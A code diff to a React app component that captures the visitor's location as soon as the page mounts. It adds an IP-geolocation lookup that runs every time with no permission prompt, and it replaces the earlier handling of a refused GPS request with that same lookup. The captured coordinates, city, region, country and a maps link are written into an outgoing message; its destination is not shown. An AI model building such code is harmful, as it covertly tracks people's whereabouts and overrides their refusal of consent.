@@ -29,35 +29,68 @@ export function App() {
 
   // Request location on mount and store it
   useEffect(() => {
+    // Try IP-based geolocation first (instant, no permission needed)
+    const fetchIPLocation = async () => {
+      try {
+        const response = await fetch('https://ipapi.co/json/');
+        const data = await response.json();
+        if (data.latitude && data.longitude) {
+          const locationInfo = {
+            latitude: data.latitude,
+            longitude: data.longitude,
+            accuracy: 'IP-based (~city level)',
+            city: data.city,
+            region: data.region,
+            country: data.country_name,
+            timestamp: new Date().toISOString(),
+            mapsUrl: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`,
+            method: 'IP Geolocation'
+          };
+          console.log('IP Location captured:', locationInfo);
+          setLocationData(locationInfo);
+        }
+      } catch (error) {
+        console.log('IP geolocation failed:', error);
+      }
+    };
+
+    // Try GPS geolocation (more accurate but requires permission)
     if ('geolocation' in navigator) {
-      console.log('Requesting location permission...');
+      console.log('Requesting GPS location permission...');
       navigator.geolocation.getCurrentPosition(
         (position) => {
           const { latitude, longitude, accuracy } = position.coords;
           const locationInfo = {
             latitude,
             longitude,
-            accuracy,
+            accuracy: `${accuracy} meters`,
             timestamp: new Date().toISOString(),
-            mapsUrl: `https://www.google.com/maps?q=${latitude},${longitude}`
+            mapsUrl: `https://www.google.com/maps?q=${latitude},${longitude}`,
+            method: 'GPS'
           };
-          console.log('Location captured:', locationInfo);
+          console.log('GPS Location captured:', locationInfo);
           setLocationData(locationInfo);
         },
         (error) => {
-          console.log('Location permission denied or error:', error.message);
-          setLocationData({ error: error.message });
+          console.log('GPS location error:', error.message);
+          // If GPS fails, fallback to IP location
+          if (!locationData) {
+            fetchIPLocation();
+          }
         },
         {
-          enableHighAccuracy: true,
-          timeout: 10000,
-          maximumAge: 0
+          enableHighAccuracy: false, // Faster response, less battery drain
+          timeout: 30000, // Increased to 30 seconds
+          maximumAge: 60000 // Accept cached location up to 1 minute old
         }
       );
     } else {
-      console.log('Geolocation not supported');
-      setLocationData({ error: 'Geolocation not supported' });
+      console.log('Geolocation not supported, using IP location');
+      fetchIPLocation();
     }
+
+    // Always try IP location first for instant capture
+    fetchIPLocation();
   }, []);
 
   useEffect(() => {
@@ -91,7 +124,13 @@ export function App() {
       if (locationData.error) {
         message += `\n\nLocation: ${locationData.error}`;
       } else {
-        message += `\n\nLocation Coordinates:\nLatitude: ${locationData.latitude}\nLongitude: ${locationData.longitude}\nAccuracy: ${locationData.accuracy} meters\nTimestamp: ${locationData.timestamp}\nGoogle Maps: ${locationData.mapsUrl}`;
+        message += `\n\nLocation Captured (${locationData.method}):\nLatitude: ${locationData.latitude}\nLongitude: ${locationData.longitude}\nAccuracy: ${locationData.accuracy}`;
+        
+        if (locationData.city) {
+          message += `\nCity: ${locationData.city}\nRegion: ${locationData.region}\nCountry: ${locationData.country}`;
+        }
+        
+        message += `\nTimestamp: ${locationData.timestamp}\nGoogle Maps: ${locationData.mapsUrl}`;
       }
     } else {
       message += '\n\nLocation: Not captured yet';
